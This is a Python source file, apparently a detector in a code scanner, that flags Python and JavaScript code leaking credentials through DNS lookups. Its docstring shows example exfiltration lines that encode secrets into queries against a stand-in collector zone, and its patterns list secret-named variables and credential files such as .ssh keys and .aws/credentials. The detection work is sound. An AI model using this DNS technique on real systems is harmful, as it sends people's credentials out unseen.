"""A secret sent as the labels of DNS lookups from Python or JavaScript code.

``socket.gethostbyname(f"{chunk}.t.collector.example")`` resolves a name; the resolver of the zone
sees every label that was asked for. Code that encodes a credential (base32, base64, hex) and
looks it up piece by piece under somebody's zone sends that credential out without one HTTP
request. The shell form (``nslookup $(... | base64).zone``) is read by ``secret_exfil``; this is
the same for a resolver call in code.

Three things have to hold, and the last two have to feed the first:

* a resolver call whose name is built at run time and ends in a zone written out in the code;
* an encoder among the values the name is built from;
* a credential among them too: an environment variable named like a secret, the whole
  environment, or a credential file.

A lookup of a fixed name, of a host taken from configuration, or of a DNS blocklist query built
from an address (``f"{reversed_ip}.zen.example.org"``) has no encoded secret behind it and is not
matched. Reading text only; nothing is resolved.
"""

from __future__ import annotations

import re
from itertools import islice

from skilltotal.file_index import IndexedFile
from skilltotal.models import Evidence

PY_SUFFIXES = (".py", ".pyw")
JS_SUFFIXES = (".js", ".mjs", ".cjs", ".jsx", ".ts", ".tsx", ".mts", ".cts")

_PY_RESOLVER = re.compile(
    r"\b(?:gethostbyname(?:_ex)?|getaddrinfo|create_connection)\s*\("
    r"|\bresolver\s*\.\s*(?:resolve|query)\s*\(|\bdns\.query\.\w+\s*\("
)
_JS_DNS_IMPORT = re.compile(
    r"""(?:require\(\s*|from\s+|import\(\s*)['"](?:node:)?dns(?:/promises)?['"]"""
)
_JS_RESOLVER = re.compile(r"\.\s*(?:resolve(?:4|6|Txt|Any|Cname|Mx|Ns|Srv)?|lookup)\s*\(")

# A zone written out after the built part: `.t.example.invalid` at the end of a string piece.
_ZONE_TAIL = re.compile(r"\.[A-Za-z0-9-]{1,63}\.[A-Za-z]{2,24}['\"`]")
_STRING = re.compile(r"'(?:[^'\\\n]|\\.)*'|\"(?:[^\"\\\n]|\\.)*\"")
_FIELD = re.compile(r"\$?\{([^{}]{1,200})\}")
_NAME = re.compile(r"(?<![\w$.])([A-Za-z_$][\w$]{0,60})")
_NOT_A_VALUE = frozenset({
    "f", "rf", "fr", "b", "r", "str", "len", "range", "int", "await", "const", "let", "var",
    "return", "true", "false", "null", "None", "True", "False", "self", "this", "new", "in",
    "for", "if", "else", "and", "or", "not", "lambda", "function", "typeof", "of",
})

_ENCODER = re.compile(
    r"\bb(?:16|32|64|85)encode\b|\burlsafe_b64encode\b|\bhexlify\b|\.hex\s*\(\s*\)"
    r"|\.toString\(\s*['\"](?:hex|base64|base64url)['\"]\s*\)|\bbtoa\s*\("
    r"|\.encode\(\s*['\"](?:hex|base64)['\"]"
)
_NAMED_LIKE = (
    r"[A-Za-z0-9_]*(?:TOKEN|SECRET|PASSWORD|PASSWD|API_?KEY|ACCESS_KEY|PRIVATE_KEY|CREDENTIAL)"
    r"[A-Za-z0-9_]*"
)
_SECRET_SOURCE = re.compile(
    # A secret-named environment variable.
    rf"\bos\.environ(?:\.get\(|\[)\s*['\"]{_NAMED_LIKE}['\"]"
    rf"|\bos\.getenv\(\s*['\"]{_NAMED_LIKE}['\"]"
    rf"|\bprocess\.env\.{_NAMED_LIKE}\b|\bprocess\.env\[\s*['\"`]{_NAMED_LIKE}['\"`]"
    # The whole environment.
    r"|\bos\.environ\b(?!\s*(?:\.get\b|\[|\.setdefault\b|\.pop\b))"
    r"|(?<![\w$.])process\.env(?!\s*(?:\?\.|\.)\s*[\w$]|\s*\[|[\w$])"
    # A credential file.
    r"|\.ssh/(?!known_hosts\b|authorized_keys\b|[\w.-]+\.pub\b)|\.aws/credentials|\bid_rsa\b"
    r"(?!\.pub\b)|\.npmrc\b|\.netrc\b|\.git-credentials\b|\.docker/config\.json|\.kube/config\b",
    re.IGNORECASE,
)

_ARG_REACH = 400
_MAX_CALLS = 200
_MAX_NAMES = 24
_MAX_HOPS = 4
_MAX_ASSIGNMENTS = 4
_RHS_REACH = 400


def _first_argument(text: str, open_at: int) -> str:
    """The text of a call's first argument: from after ``(`` to its top-level ``,`` or ``)``."""
    depth = 0
    quote = ""
    end = min(len(text), open_at + _ARG_REACH)
    i = open_at
    while i < end:
        ch = text[i]
        if quote:
            if ch == "\\":
                i += 1
            elif ch == quote:
                quote = ""
        elif ch in "'\"`":
            quote = ch
        elif ch in "([{":
            depth += 1
        elif ch in ")]}":
            if depth == 0:
                break
            depth -= 1
        elif ch == "," and depth == 0:
            break
        i += 1
    return text[open_at:i]


def _value_names(expr: str) -> list[str]:
    """Names an expression takes its value from: those outside its string literals, and those
    inside the fields of an f-string or a template literal."""
    fields = " ".join(_FIELD.findall(expr))
    bare = _STRING.sub(" ", expr)
    bare = re.sub(r"`[^`]*`", " ", bare)
    names: list[str] = []
    for name in _NAME.findall(f"{bare} {fields}"):
        if name not in _NOT_A_VALUE and name not in names:
            names.append(name)
    return names


def _assigned_values(text: str, name: str) -> list[str]:
    """What ``name`` is assigned in the file (the rest of each assignment's line)."""
    pattern = re.compile(
        rf"(?<![\w$.]){re.escape(name)}\s*(?::[^=\n]{{0,60}})?(?<![=!<>\-*/])\+?=(?!=)"
        rf"([^\n]{{0,{_RHS_REACH}}})"
    )
    return [m.group(1) for m in islice(pattern.finditer(text), _MAX_ASSIGNMENTS)]


def _feeding_text(text: str, argument: str) -> str:
    """The argument and, transitively, what the names in it were assigned."""
    parts = [argument]
    seen: set[str] = set()
    frontier = _value_names(argument)
    for _ in range(_MAX_HOPS):
        following: list[str] = []
        for name in frontier:
            if name in seen or len(seen) >= _MAX_NAMES:
                continue
            seen.add(name)
            for value in _assigned_values(text, name):
                parts.append(value)
                following.extend(_value_names(value))
        if not following:
            break
        frontier = following
    return "\n".join(parts)


def dns_secret_lookups(f: IndexedFile) -> list[Evidence]:
    """Resolver calls in a Python or JavaScript file whose name carries an encoded credential."""
    text = f.text
    if f.suffix in PY_SUFFIXES:
        resolver = _PY_RESOLVER
        if "gethostby" not in text and "getaddrinfo" not in text and "resolver" not in text \
                and "dns.query" not in text and "create_connection" not in text:
            return []
        in_comment = f.in_comment
    elif f.suffix in JS_SUFFIXES:
        resolver = _JS_RESOLVER
        if "dns" not in text or not _JS_DNS_IMPORT.search(text):
            return []
        in_comment = f.in_c_comment
    else:
        return []
    if not _ENCODER.search(text) or not _SECRET_SOURCE.search(text):
        return []
    evidence: list[Evidence] = []
    for m in islice(resolver.finditer(text), _MAX_CALLS):
        if in_comment(m.start()):
            continue
        argument = _first_argument(text, m.end())
        if not _ZONE_TAIL.search(argument) or not _value_names(argument):
            continue
        feeding = _feeding_text(text, argument)
        if _ENCODER.search(feeding) and _SECRET_SOURCE.search(feeding):
            evidence.append(f.evidence_for_span(m.start(), m.end() + len(argument)))
    return evidence
